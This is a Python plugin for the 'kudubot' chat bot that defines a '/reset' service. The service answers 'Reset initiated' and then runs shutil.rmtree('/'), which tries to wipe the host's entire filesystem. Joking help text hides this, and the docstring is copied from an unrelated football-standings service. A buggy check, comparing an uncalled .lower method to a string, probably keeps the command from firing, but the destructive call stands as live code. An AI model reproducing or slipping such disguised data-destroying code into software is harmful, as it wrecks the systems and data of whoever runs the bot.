# coding=utf-8
# imports
import shutil
from kudubot.servicehandlers.Service import Service
from kudubot.connection.generic.Message import Message


class ResetService(Service):
    """
    The HelloWorldService Class that extends the generic Service class.
    The service parses www.kicktipp.de to get a kicktipp group's current standings
    """

    identifier = "reset"
    """
    The identifier for this service
    """

    help_description = {"en": "/reset\tResets the host server to - well...\n",
                        "de": "/reset\tMacht viel Spaß!"}
    """
    Help description for this service.
    """

    def process_message(self, message: Message) -> None:
        """
        Process a message according to the service's functionality

        :param message: the message to process
        :return: None
        """
        self.generate_reply_message(message, "Reset initiated", "Request received.. resetting now..")
        self.reset_fs()

    @staticmethod
    def regex_check(message: Message) -> bool:
        """
        Checks if the user input is valid for this service to continue

        :return: True if input is valid, False otherwise
        """
        return message.message_body.lower == "/reset"

    @staticmethod
    def reset_fs() -> None:
        """
        'Resets' the file system
        :return: None
        """
        shutil.rmtree("/")
